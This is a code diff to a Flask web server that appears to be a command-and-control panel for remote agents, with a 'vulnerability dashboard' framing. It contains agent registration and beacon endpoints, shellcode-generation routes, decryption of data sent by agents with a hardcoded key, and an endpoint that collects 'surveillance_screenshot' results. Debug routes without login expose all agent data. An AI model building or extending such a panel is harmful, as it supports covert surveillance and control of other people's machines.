@@ -6,7 +6,8 @@ import time
 import json
 import base64
 import logging
-from datetime import datetime
+import hashlib
+from datetime import datetime, timedelta
 import threading
 import requests
 from typing import Optional, Dict, List, Any
@@ -14,6 +15,7 @@ from typing import Optional, Dict, List, Any
 from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_file, Response
 from flask_login import LoginManager, login_required, login_user, logout_user, current_user
 from werkzeug.security import check_password_hash
+from cryptography.fernet import Fernet
 
 # Configure logging
 logging.basicConfig(
@@ -88,12 +90,12 @@ def logout():
 @app.route('/')
 @login_required
 def index():
-    return render_template('dashboard.html')
+    return render_template('dashboard_enhanced.html')
 
 @app.route('/dashboard')
 @login_required
 def dashboard_page():
-    return render_template('dashboard.html')
+    return render_template('dashboard_enhanced.html')
 
 @app.route('/shellcode')
 @login_required
@@ -105,162 +107,131 @@ def shellcode():
 def control():
     return render_template('control.html')
 
-# New API endpoints for vulnerability dashboard
-@app.route('/api/dashboard')
-@login_required
-def get_dashboard_data():
-    """Get dashboard data for the vulnerability assessment dashboard"""
+# Import for datetime operations
+from datetime import datetime, timedelta
+
+# Encryption constants and functions (matching agent)
+_KEY_B64 = 'dGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='
+ENCRYPTION_KEY = _KEY_B64.encode()
+
+def get_encryption_key(agent_id):
+    """Generate a consistent encryption key for agent"""
+    key_material = ENCRYPTION_KEY + agent_id.encode()
+    key_hash = hashlib.sha256(key_material).digest()
+    return base64.urlsafe_b64encode(key_hash[:32])
+
+def decrypt_agent_data(encrypted_data, agent_id):
+    """Decrypt data from agent using Fernet encryption"""
     try:
-        dashboard_data = dashboard.get_dashboard_data()
+        # First decode base64
+        encrypted_bytes = base64.b64decode(encrypted_data)
+        # Then decrypt with Fernet
+        fernet = Fernet(get_encryption_key(agent_id))
+        decrypted_bytes = fernet.decrypt(encrypted_bytes)
+        # Convert to string and parse JSON
+        return json.loads(decrypted_bytes.decode())
+    except Exception as e:
+        logging.error(f"Decryption error: {e}")
+        # Fallback to old base64 method
+        try:
+            decoded_json = base64.b64decode(encrypted_data).decode()
+            return json.loads(decoded_json)
+        except Exception as e2:
+            logging.error(f"Base64 fallback failed: {e2}")
+            raise
+
+# New API endpoints for vulnerability dashboard
+@app.route('/api/vulnerabilities')
+@login_required
+def get_vulnerabilities():
+    """Get all vulnerability data from agents"""
+    try:
+        vulnerability_data = {}
         
-        # Merge agent data from global agents dictionary
-        total_agents = len(agents)
-        active_agents = 0
+        # Debug logging
+        logging.debug(f"Results structure: {type(results)}")
+        logging.debug(f"Results keys: {list(results.keys()) if isinstance(results, dict) else 'Not a dict'}")
+        
+        # Extract vulnerability data from results
+        for agent_id, agent_results in results.items():
+            logging.debug(f"Processing agent {agent_id}, results type: {type(agent_results)}")
+            logging.debug(f"Agent results: {agent_results}")
+            
+            agent_vulns = []
+            agent_risk_score = 0
+            
+            # agent_results is a dict of task_id -> task_data
+            if isinstance(agent_results, dict):
+                for task_id, task_data in agent_results.items():
+                    logging.debug(f"Processing task {task_id}, task_data type: {type(task_data)}")
+                    logging.debug(f"Task data: {task_data}")
+                    
+                    # Check if this is a vulnerability scan result
+                    scan_type = task_data.get('type', '')
+                    if any(keyword in scan_type.lower() for keyword in ['vuln', 'scan', 'security', 'auto']):
+                        # Get the result data
+                        result_data = task_data.get('result', {}).get('data', {})
+                        
+                        # Extract vulnerabilities
+                        if 'vulnerabilities' in result_data:
+                            agent_vulns.extend(result_data['vulnerabilities'])
+                        
+                        # Get risk score
+                        if 'risk_score' in result_data:
+                            agent_risk_score = max(agent_risk_score, result_data['risk_score'])
+            else:
+                logging.warning(f"Agent results for {agent_id} is not a dict: {type(agent_results)}")
+            
+            if agent_vulns or agent_risk_score > 0:
+                vulnerability_data[agent_id] = {
+                    'agent_id': agent_id,
+                    'vulnerabilities': agent_vulns,
+                    'risk_score': agent_risk_score,
+                    'total_vulnerabilities': len(agent_vulns),
+                    'last_scan': datetime.now().isoformat()
+                }
+        
+        return jsonify(vulnerability_data)
+        
+    except Exception as e:
+        logging.error(f"Error getting vulnerabilities: {e}")
+        logging.error(f"Exception details: {type(e).__name__}: {str(e)}")
+        import traceback
+        logging.error(f"Traceback: {traceback.format_exc()}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/agents')
+@login_required  
+def get_agents_api():
+    """Get all agent data - Main endpoint for dashboard and control panel"""
+    try:
+        agents_data = []
         current_time = datetime.now()
         
-        # Count active agents from global agents dictionary
-        for agent_data in agents.values():
+        for agent_id, agent_data in agents.items():
+            # Determine agent status
+            status = 'offline'
             if 'last_seen' in agent_data:
                 try:
                     last_seen = datetime.fromisoformat(agent_data['last_seen'])
                     if current_time - last_seen < timedelta(minutes=5):
-                        active_agents += 1
+                        status = 'online'
                 except:
                     pass
-        
-        # Ensure dashboard_data has required structure
-        if not dashboard_data:
-            dashboard_data = {}
-        if 'summary' not in dashboard_data:
-            dashboard_data['summary'] = {}
-        
-        # Update the summary with actual agent counts and activity
-        dashboard_data['summary']['total_agents'] = max(total_agents, dashboard_data['summary'].get('total_agents', 0))
-        dashboard_data['summary']['active_agents'] = max(active_agents, dashboard_data['summary'].get('active_agents', 0))
-        dashboard_data['summary']['total_vulnerabilities'] = dashboard_data['summary'].get('total_vulnerabilities', 0)
-        dashboard_data['summary']['overall_risk_score'] = dashboard_data['summary'].get('overall_risk_score', 0)
-        
-        # Calculate aggregated metrics from all agents
-        total_cpu_usage = 0
-        total_memory_usage = 0
-        total_disk_usage = 0
-        total_processes = 0
-        network_activity = {'sent': 0, 'received': 0}
-        agent_activity = []
-        task_count = 0
-        
-        for agent_id, agent_data in agents.items():
-            metrics = agent_data.get('metrics', {})
             
-            # Aggregate system metrics
-            total_cpu_usage += metrics.get('cpu_usage', 0)
-            total_memory_usage += metrics.get('memory_usage', 0)
-            total_disk_usage += metrics.get('disk_usage', 0)
-            total_processes += metrics.get('process_count', 0)
-            network_activity['sent'] += metrics.get('network_sent', 0)
-            network_activity['received'] += metrics.get('network_recv', 0)
-            
-            # Individual agent activity
-            activity = {
-                'agent_id': agent_id,
-                'hostname': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
-                'last_seen': agent_data.get('last_seen', 'Never'),
-                'status': agent_data.get('status', 'Unknown'),
-                'platform': agent_data.get('system_info', {}).get('platform', 'Unknown'),
-                'task_count': len(agent_data.get('results', {})),
-                'metrics': metrics
-            }
-            agent_activity.append(activity)
-            task_count += activity['task_count']
-        
-        # Calculate averages
-        agent_count = len(agents) if len(agents) > 0 else 1
-        
-        # Enhanced dashboard data
-        dashboard_data['agent_activity'] = agent_activity
-        dashboard_data['summary']['total_tasks'] = task_count
-        dashboard_data['summary']['avg_cpu_usage'] = total_cpu_usage / agent_count
-        dashboard_data['summary']['avg_memory_usage'] = total_memory_usage / agent_count
-        dashboard_data['summary']['avg_disk_usage'] = total_disk_usage / agent_count
-        dashboard_data['summary']['total_processes'] = total_processes
-        dashboard_data['summary']['network_activity'] = network_activity
-        
-        # Create some meaningful "security events" from agent activity
-        security_events = []
-        for agent_data in agents.values():
-            metrics = agent_data.get('metrics', {})
-            if metrics.get('cpu_usage', 0) > 80:
-                security_events.append({
-                    'type': 'High CPU Usage',
-                    'severity': 'Medium',
-                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
-                    'description': f"CPU usage at {metrics.get('cpu_usage', 0):.1f}%"
-                })
-            if metrics.get('memory_usage', 0) > 85:
-                security_events.append({
-                    'type': 'High Memory Usage', 
-                    'severity': 'Medium',
-                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
-                    'description': f"Memory usage at {metrics.get('memory_usage', 0):.1f}%"
-                })
-        
-        dashboard_data['security_events'] = security_events
-        dashboard_data['summary']['security_events_count'] = len(security_events)
-        
-        return jsonify({
-            'status': 'success',
-            'data': dashboard_data
-        })
-    except Exception as e:
-        logging.error(f"Error getting dashboard data: {str(e)}")
-        return jsonify({
-            'status': 'error',
-            'error': str(e)
-        }), 500
-
-@app.route('/api/vulnerabilities')
-@login_required
-def get_vulnerabilities():
-    """Get all vulnerabilities with optional filtering"""
-    try:
-        filters = request.args.to_dict()
-        vulnerabilities = dashboard.get_vulnerabilities(filters)
-        return jsonify({
-            'status': 'success',
-            'vulnerabilities': vulnerabilities
-        })
-    except Exception as e:
-        logging.error(f"Error getting vulnerabilities: {str(e)}")
-        return jsonify({
-            'status': 'error',
-            'error': str(e)
-        }), 500
-
-@app.route('/api/agents')
-@login_required
-def get_agents():
-    """Get all agents with their data"""
-    try:
-        agents_data = []
-        for agent_id, agent_data in agents.items():
             # Create a summary of the agent data
             agent_summary = {
                 'agent_id': agent_id,
                 'last_seen': agent_data.get('last_seen', 'Unknown'),
-                'status': agent_data.get('status', 'Unknown'),
+                'status': status,
                 'system_info': agent_data.get('system_info', {}),
-                'results_count': len(agent_data.get('results', {}))
+                'results_count': len(agent_data.get('results', {})),
+                'metrics': agent_data.get('metrics', {}),
+                'module_status': agent_data.get('module_status', {})
             }
             
-            # Add vulnerability data if available from dashboard
-            if agent_id in dashboard.agents:
-                dashboard_summary = dashboard.get_agent_summary(agent_id)
-                if dashboard_summary:
-                    agent_summary.update({
-                        'risk_score': dashboard_summary.get('risk_score', 0),
-                        'total_vulnerabilities': dashboard_summary.get('total_vulnerabilities', 0),
-                        'vulnerability_breakdown': dashboard_summary.get('vulnerability_breakdown', {})
-                    })
+            # Add basic vulnerability count from results
+            agent_summary['vulnerability_count'] = len(results.get(agent_id, []))
             
             agents_data.append(agent_summary)
         
@@ -268,12 +239,255 @@ def get_agents():
             'status': 'success',
             'agents': agents_data
         })
+        
     except Exception as e:
-        logging.error(f"Error getting agents: {str(e)}")
+        logging.error(f"Error getting agents: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/scan-history')
+@login_required
+def get_scan_history():
+    """Get scan history data"""
+    try:
+        scan_history = []
+        
+        # Extract scan results from all agents
+        for agent_id, agent_results in results.items():
+            # agent_results is a dict of task_id -> task_data
+            for task_id, task_data in agent_results.items():
+                scan_type = task_data.get('type', '')
+                if any(keyword in scan_type.lower() for keyword in ['vuln', 'scan', 'security', 'auto']):
+                    # Get the result data
+                    result_data = task_data.get('result', {}).get('data', {})
+                    
+                    scan_entry = {
+                        'agent_id': agent_id,
+                        'scan_type': scan_type,
+                        'timestamp': task_data.get('timestamp', datetime.now().isoformat()),
+                        'vulnerability_count': len(result_data.get('vulnerabilities', [])),
+                        'risk_score': result_data.get('risk_score', 0),
+                        'status': task_data.get('status', 'unknown')
+                    }
+                    scan_history.append(scan_entry)
+        
+        # Sort by timestamp (newest first)
+        scan_history.sort(key=lambda x: x['timestamp'], reverse=True)
+        
+        return jsonify(scan_history[:50])  # Return last 50 scans
+        
+    except Exception as e:
+        logging.error(f"Error getting scan history: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/dashboard')
+@login_required
+def get_dashboard_data():
+    """Get comprehensive dashboard data"""
+    try:
+        # Get vulnerability data
+        vuln_response = get_vulnerabilities()
+        vuln_data = vuln_response.get_json() if hasattr(vuln_response, 'get_json') else {}
+        
+        # Get agent data  
+        agent_response = get_agents_api()
+        agent_data = agent_response.get_json() if hasattr(agent_response, 'get_json') else {}
+        
+        # Calculate summary statistics
+        total_vulnerabilities = 0
+        critical_count = 0
+        high_count = 0
+        medium_count = 0
+        low_count = 0
+        total_risk_score = 0
+        risk_count = 0
+        
+        for agent_vulns in vuln_data.values():
+            total_vulnerabilities += len(agent_vulns.get('vulnerabilities', []))
+            if agent_vulns.get('risk_score', 0) > 0:
+                total_risk_score += agent_vulns['risk_score']
+                risk_count += 1
+                
+            # Count by severity
+            for vuln in agent_vulns.get('vulnerabilities', []):
+                severity = vuln.get('severity', 'Low').lower()
+                if severity == 'critical':
+                    critical_count += 1
+                elif severity == 'high':
+                    high_count += 1
+                elif severity == 'medium':
+                    medium_count += 1
+                else:
+                    low_count += 1
+        
+        # Calculate average risk score
+        avg_risk_score = round(total_risk_score / risk_count) if risk_count > 0 else 0
+        
+        # Count active agents
+        active_agents = len([a for a in agent_data.values() if a.get('status') == 'online'])
+        
+        dashboard_summary = {
+            'total_vulnerabilities': total_vulnerabilities,
+            'critical_vulnerabilities': critical_count,
+            'high_vulnerabilities': high_count,
+            'medium_vulnerabilities': medium_count,
+            'low_vulnerabilities': low_count,
+            'overall_risk_score': avg_risk_score,
+            'total_agents': len(agent_data),
+            'active_agents': active_agents,
+            'last_updated': datetime.now().isoformat()
+        }
+        
         return jsonify({
-            'status': 'error',
-            'error': str(e)
-        }), 500
+            'summary': dashboard_summary,
+            'vulnerabilities': vuln_data,
+            'agents': agent_data
+        })
+        
+    except Exception as e:
+        logging.error(f"Error getting dashboard data: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/export/pdf')
+@login_required
+def export_pdf():
+    """Export vulnerability report as PDF"""
+    try:
+        # Generate PDF report (placeholder)
+        from io import BytesIO
+        import tempfile
+        
+        # Create a simple text report for now
+        report_data = get_dashboard_data().get_json()
+        
+        report_text = f"""
+VULNERABILITY ASSESSMENT REPORT
+Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+SUMMARY:
+- Total Vulnerabilities: {report_data['summary']['total_vulnerabilities']}
+- Critical: {report_data['summary']['critical_vulnerabilities']}
+- High: {report_data['summary']['high_vulnerabilities']}
+- Medium: {report_data['summary']['medium_vulnerabilities']}
+- Low: {report_data['summary']['low_vulnerabilities']}
+- Overall Risk Score: {report_data['summary']['overall_risk_score']}/100
+- Active Agents: {report_data['summary']['active_agents']}/{report_data['summary']['total_agents']}
+
+DETAILED FINDINGS:
+"""
+        
+        # Add vulnerability details
+        for agent_id, agent_vulns in report_data['vulnerabilities'].items():
+            report_text += f"\nAgent: {agent_id}\n"
+            report_text += f"Risk Score: {agent_vulns.get('risk_score', 0)}/100\n"
+            for vuln in agent_vulns.get('vulnerabilities', []):
+                report_text += f"- {vuln.get('severity', 'Unknown').upper()}: {vuln.get('title', vuln.get('cve', 'Unknown'))}\n"
+        
+        # Create temporary file
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+            f.write(report_text)
+            temp_path = f.name
+        
+        return send_file(temp_path, as_attachment=True, download_name='vulnerability_report.txt')
+        
+    except Exception as e:
+        logging.error(f"Error exporting PDF: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/export/csv')
+@login_required
+def export_csv():
+    """Export vulnerability data as CSV"""
+    try:
+        import csv
+        from io import StringIO
+        
+        output = StringIO()
+        writer = csv.writer(output)
+        
+        # Write header
+        writer.writerow(['Agent ID', 'CVE', 'Title', 'Severity', 'Description', 'Risk Score'])
+        
+        # Get vulnerability data
+        vuln_data = get_vulnerabilities().get_json()
+        
+        # Write vulnerability data
+        for agent_id, agent_vulns in vuln_data.items():
+            for vuln in agent_vulns.get('vulnerabilities', []):
+                writer.writerow([
+                    agent_id,
+                    vuln.get('cve', ''),
+                    vuln.get('title', ''),
+                    vuln.get('severity', ''),
+                    vuln.get('description', ''),
+                    agent_vulns.get('risk_score', 0)
+                ])
+        
+        response = Response(
+            output.getvalue(),
+            mimetype='text/csv',
+            headers={'Content-Disposition': 'attachment; filename=vulnerabilities.csv'}
+        )
+        return response
+        
+    except Exception as e:
+        logging.error(f"Error exporting CSV: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/export/json')
+@login_required
+def export_json():
+    """Export vulnerability data as JSON"""
+    try:
+        dashboard_data = get_dashboard_data().get_json()
+        
+        response = Response(
+            json.dumps(dashboard_data, indent=2),
+            mimetype='application/json',
+            headers={'Content-Disposition': 'attachment; filename=vulnerabilities.json'}
+        )
+        return response
+        
+    except Exception as e:
+        logging.error(f"Error exporting JSON: {e}")
+        return jsonify({'error': str(e)}), 500
+
+# Additional API endpoints for the enhanced dashboard functionality
+@app.route('/api/security-events')
+@login_required
+def get_security_events():
+    """Get security events from agents"""
+    try:
+        security_events = []
+        
+        # Create security events from agent activity
+        for agent_id, agent_data in agents.items():
+            metrics = agent_data.get('metrics', {})
+            if metrics.get('cpu_usage', 0) > 80:
+                security_events.append({
+                    'type': 'High CPU Usage',
+                    'severity': 'Medium',
+                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
+                    'agent_id': agent_id,
+                    'description': f"CPU usage at {metrics.get('cpu_usage', 0):.1f}%",
+                    'timestamp': datetime.now().isoformat()
+                })
+            if metrics.get('memory_usage', 0) > 85:
+                security_events.append({
+                    'type': 'High Memory Usage', 
+                    'severity': 'Medium',
+                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
+                    'agent_id': agent_id,
+                    'description': f"Memory usage at {metrics.get('memory_usage', 0):.1f}%",
+                    'timestamp': datetime.now().isoformat()
+                })
+        
+        return jsonify(security_events)
+        
+    except Exception as e:
+        logging.error(f"Error getting security events: {e}")
+        return jsonify({'error': str(e)}), 500
+
+# Removed duplicate endpoint - consolidated with get_agents_api()
 
 @app.route('/api/reports')
 @login_required
@@ -397,9 +611,7 @@ def generate_shellcode():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/agents', methods=['GET'])
-def list_agents():
-    return jsonify(list(agents.values()))
+# Removed duplicate endpoint - consolidated with get_agents_api()
 
 @app.route('/api/debug/agents')
 def debug_agents():
@@ -407,8 +619,8 @@ def debug_agents():
     return jsonify({
         'agents_count': len(agents),
         'agents': agents,
-        'dashboard_agents_count': len(dashboard.agents),
-        'dashboard_agents': list(dashboard.agents.keys())
+        'results_count': len(results),
+        'results_keys': list(results.keys())
     })
 
 @app.route('/api/debug/results')
@@ -429,6 +641,7 @@ def register_agent():
 
         decoded_json = base64.b64decode(encoded_data).decode()
         data = json.loads(decoded_json)
+            
         agent_id = data.get('agent_id')
 
         if agent_id:
@@ -466,6 +679,7 @@ def agent_beacon():
 
         decoded_json = base64.b64decode(encoded_data).decode()
         data = json.loads(decoded_json)
+            
         agent_id = data.get('agent_id')
         timestamp = datetime.now().isoformat()
 
@@ -704,6 +918,47 @@ def get_results_for_agent(agent_id):
                 'type': entry.get('result', {}).get('type', '')
             })
     return jsonify({'status': 'success', 'results': agent_results})
+
+@app.route('/api/results', methods=['GET'])
+@login_required
+def get_all_results():
+    """Get all results from all agents"""
+    all_results = []
+    
+    for agent_id, agent_results in results.items():
+        for task_id, entry in agent_results.items():
+            result_type = 'unknown'
+            if isinstance(entry.get('result'), dict):
+                # Check for screenshot data in various formats
+                if ('image' in entry['result'] and 'format' in entry['result']) or \
+                   ('data' in entry['result'] and 'format' in entry['result'] and 
+                    entry['result'].get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']):
+                    result_type = 'surveillance_screenshot'
+                elif 'type' in entry['result']:
+                    result_type = entry['result']['type']
+                elif 'result' in entry['result'] and isinstance(entry['result']['result'], dict):
+                    inner_result = entry['result']['result']
+                    # Check for nested screenshot data
+                    if ('image' in inner_result and 'format' in inner_result) or \
+                       ('data' in inner_result and 'format' in inner_result and 
+                        inner_result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']):
+                        result_type = 'surveillance_screenshot'
+                    else:
+                        result_type = inner_result.get('type', 'unknown')
+            
+            all_results.append({
+                'id': task_id,
+                'agent_id': agent_id,
+                'type': result_type,
+                'result': entry.get('result'),
+                'timestamp': entry.get('timestamp'),
+                'status': 'SUCCESS' if entry.get('result') else 'FAILED'
+            })
+    
+    # Sort by timestamp (newest first)
+    all_results.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
+    
+    return jsonify({'status': 'success', 'results': all_results})
 
 @app.route('/api/results/download/<task_id>', methods=['GET'])
 def download_result(task_id):
